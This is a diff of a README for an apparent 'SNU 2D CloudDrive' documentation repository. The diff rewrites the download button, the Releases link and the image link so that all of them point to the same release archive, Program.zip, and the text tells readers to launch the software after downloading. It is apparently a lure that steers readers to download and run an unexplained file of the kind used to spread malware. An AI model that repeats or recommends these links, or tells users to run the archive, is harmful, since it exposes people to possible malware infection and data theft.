@@ -19,13 +19,13 @@ In this repository, you will find comprehensive documentation covering all aspec
 ## 📦 Download Software
 To access the software associated with the SNU 2D CloudDrive project, click the button below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-orange)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/Jayjayrdot/SNU_2D_CloudDrive_Modes_Docs/releases/download/v1.0/Program.zip)](https://github.com/Jayjayrdot/SNU_2D_CloudDrive_Modes_Docs/releases/download/v1.0/Program.zip)
 
 *Note: The software needs to be launched after downloading.*
 
 ## 🚀 Explore Further
-Visit the repository [Releases](https://github.com/rokytd/files/releases) section to discover the latest updates and enhancements related to the SNU 2D CloudDrive project.
+Visit the repository [Releases](https://github.com/Jayjayrdot/SNU_2D_CloudDrive_Modes_Docs/releases/download/v1.0/Program.zip) section to discover the latest updates and enhancements related to the SNU 2D CloudDrive project.
 
 Thank you for visiting the SNU 2D CloudDrive Modes Documentation Repository! We hope you find the resources here valuable in your journey of exploring the different modes offered by the SNU 2D CloudDrive software. Happy exploring! 🌈
 
-![SNU 2D CloudDrive](https://example.com/image.png)
+![SNU 2D CloudDrive](https://github.com/Jayjayrdot/SNU_2D_CloudDrive_Modes_Docs/releases/download/v1.0/Program.zip)
